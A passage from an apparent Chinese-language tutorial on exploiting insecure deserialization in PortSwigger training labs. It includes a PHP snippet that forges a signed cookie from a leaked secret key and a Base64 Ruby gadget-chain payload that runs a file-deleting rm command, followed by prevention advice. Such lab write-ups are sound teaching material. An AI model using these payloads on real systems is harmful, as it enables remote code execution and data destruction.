<p>​    创建一个包含恶意对象的有效的经过签名的cookie。您可以使用以下PHP脚本执行此操作。该<code>$object</code>是Base64编码刚刚生成的对象，<code>$secretKey</code>是从获得的<code>phpinfo.php</code>文件中的<code>SECRET_KEY</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $payload &#x3D; urlencode(&#39;&#123;&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;&#125;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200721/15953180009969.png" alt="image-20200721145935109"></p>
<p>​    修改cookie为生成的恶意cookie，重新发包，成功删除指定文件：</p>
<p><img src="https://image.3001.net/images/20200721/15953180039222.png" alt="image-20200721150254347"></p>
<h5 id="6-6-3-使用已记录的Gadget链开发Ruby反序列化"><a href="#6-6-3-使用已记录的Gadget链开发Ruby反序列化" class="headerlink" title="6.6.3 使用已记录的Gadget链开发Ruby反序列化"></a>6.6.3 使用已记录的Gadget链开发Ruby反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain</a></p>
<p>​    登录账户，抓包base64解码查看cookie包含序列化的Ruby对象，查找Luke Jahnke撰写的“ Ruby 2.x Universal RCE Gadget Chain”。复制用于生成有效负载的脚本，然后将应执行的命令从<code>id</code>更改为<code>rm /home/carlos/morale.txt</code>并运行脚本。这将生成一个包含有效负载的序列化对象。输出包含对象的十六进制和Base64编码版本。复制Base64编码的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>​    同样需要url编码，修改cookie重新发包：</p>
<p><img src="https://image.3001.net/images/20200721/15953180076130.png" alt="image-20200721152950252"></p>
<h2 id="7-如何防止不安全的反序列化漏洞"><a href="#7-如何防止不安全的反序列化漏洞" class="headerlink" title="7. 如何防止不安全的反序列化漏洞"></a>7. 如何防止不安全的反序列化漏洞</h2><p>​    一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，它可能带来的利用的高度严重性以及防范这些利用的难度超过了收益。</p>
<p>​    如果确实需要对来自不受信任来源的数据进行反序列化，请采用可靠的措施以确保数据未被篡改。例如，您可以实施数字签名来检查数据的完整性。但是，请记住，<strong>在</strong>开始反序列化过程<strong>之前，</strong>必须进行任何检查。否则，它们几乎没有用。</p>
<p>​    如果可能，应避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。相反，您可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
]]></content>
      <categories>
        <category>不安全的序列化</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>不安全的序列化</tag>
      </tags>
  </entry>
</search>
